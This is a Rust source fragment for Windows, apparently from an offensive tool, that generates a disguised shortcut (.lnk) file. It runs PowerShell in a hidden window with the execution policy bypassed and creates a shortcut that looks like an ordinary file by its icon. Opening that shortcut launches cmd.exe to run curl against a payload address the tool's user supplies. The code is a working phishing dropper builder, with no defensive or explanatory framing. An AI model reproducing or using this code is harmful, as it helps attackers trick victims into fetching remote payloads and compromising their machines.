
#[cfg(target_os = "windows")]
pub fn generate_lnk(output_path: &str, payload: &str) -> Result<(), Box<dyn std::error::Error>> {
    use std::os::windows::process::CommandExt;
    use std::process::Command;
    
    // PowerShell command with template replacement
    let ps_script = format!(r#"
        $WshShell = New-Object -comObject WScript.Shell
        $Shortcut = $WshShell.CreateShortcut('{0}')
        $Shortcut.TargetPath = 'C:\Windows\System32\cmd.exe'
        $Shortcut.IconLocation = '%SystemRoot%\System32\shell32.dll, 28'
        $Shortcut.Arguments = '/c (curl {1})'
        $Shortcut.Save()
    "#, output_path.replace("'", "''"), payload.replace("'", "''"));

    // Execute PowerShell with hidden window (Windows-only)
    Command::new("powershell.exe")
        .args(&[
            "-ExecutionPolicy", 
            "Bypass",
            "-Command",
            &ps_script
        ])
        .creation_flags(0x08000000) // CREATE_NO_WINDOW
        .status()?;

    Ok(())
}
